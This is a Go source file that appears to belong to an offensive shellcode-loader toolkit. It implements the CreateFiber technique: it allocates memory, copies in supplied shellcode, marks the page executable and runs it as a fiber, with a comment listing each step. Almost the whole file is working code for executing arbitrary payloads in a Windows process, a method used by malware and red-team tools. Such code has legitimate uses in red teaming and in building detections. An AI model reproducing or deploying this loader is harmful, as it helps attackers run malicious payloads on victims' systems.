package loaders

import (
	"fmt"
	"github.com/ma111e/moonboots/internal/consts"
	"github.com/ma111e/moonboots/internal/defs"
	log "github.com/sirupsen/logrus"
	"golang.org/x/sys/windows"
	"unsafe"
)

/*
This technique executes shellcode in the current process using the following steps
	1. Convert the main thread into a fiber with the ConvertThreadToFiber function
	2. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
	3. Copy the shellcode to the allocated memory space
	4. Change the memory page permissions to Execute/Read with VirtualProtect
	5. Call CreateFiber on shellcode address
	6. Call SwitchToFiber to start the fiber and execute the shellcode

NOTE: Currently This technique will NOT exit even after the shellcode has been executed. You must force terminate this process

This technique loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.
Reference: https://ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber
*/

const (
	LdrCreateFiber = "createfiber"
)

type CreateFiberLoader struct {
	Base
}

func init() {
	AvailableLoaders.Register(LdrCreateFiber, &CreateFiberLoader{})
}

func (ldr CreateFiberLoader) ValidArchs() []string {
	return consts.VALID_ARCH_BOTH
}

func (ldr CreateFiberLoader) Run(shellcode []byte) error {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")

	VirtualAllocProc := kernel32.NewProc("VirtualAlloc")
	VirtualProtectProc := kernel32.NewProc("VirtualProtect")
	ConvertThreadToFiberProc := kernel32.NewProc("ConvertThreadToFiber")
	CreateFiberProc := kernel32.NewProc("CreateFiber")
	SwitchToFiberProc := kernel32.NewProc("SwitchToFiber")

	log.Debugln("Calling ConvertThreadToFiberProc...")

	fiberAddr, _, err := ConvertThreadToFiberProc.Call()

	if err != nil && err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error calling ConvertThreadToFiberProc: %s", err)
	}

	log.Printf("Fiber address: %x", fiberAddr)

	log.Debugln("Calling VirtualAllocProc for shellcode")
	addr, _, err := VirtualAllocProc.Call(0, uintptr(len(shellcode)), defs.MEM_COMMIT|defs.MEM_RESERVE, defs.PAGE_READWRITE)

	if err != nil && err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error calling VirtualAllocProc: %s", err)
	}

	if addr == 0 {
		return fmt.Errorf("VirtualAllocProcErrorf and returned 0")
	}

	log.Printf("Allocated %d bytes", len(shellcode))

	log.Debugln("Copying shellcode to memory with copy")

	copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:len(shellcode)], shellcode)
	log.Println("Shellcode copied to memory")

	log.Debugln("Calling VirtualProtectProc to change memory region to PAGE_EXECUTE_READ")

	oldProtect := defs.PAGE_READWRITE
	_, _, err = VirtualProtectProc.Call(addr, uintptr(len(shellcode)), defs.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil && err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error calling VirtualProtectProc: %s", err)
	}
	log.Println("Shellcode memory region changed to PAGE_EXECUTE_READ")

	log.Debugln("Calling CreateFiberProc...")

	fiber, _, err := CreateFiberProc.Call(0, addr, 0)

	if err != nil && err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error calling CreateFiberProc: %s", err)
	}

	log.Printf("Shellcode fiber created: %x", fiber)

	log.Debugln("Calling SwitchToFiberProc function to execute the shellcode")

	_, _, err = SwitchToFiberProc.Call(fiber)
	if err != nil && err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error calling SwitchToFiberProc: %s", err)
	}

	log.Println("Shellcode Executed")
	log.Debugln("Calling SwitchToFiberProc on main thread/fiber")

	_, _, err = SwitchToFiberProc.Call(fiberAddr)
	if err != nil && err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error calling SwitchToFiberProc: %s", err)
	}

	return nil
}
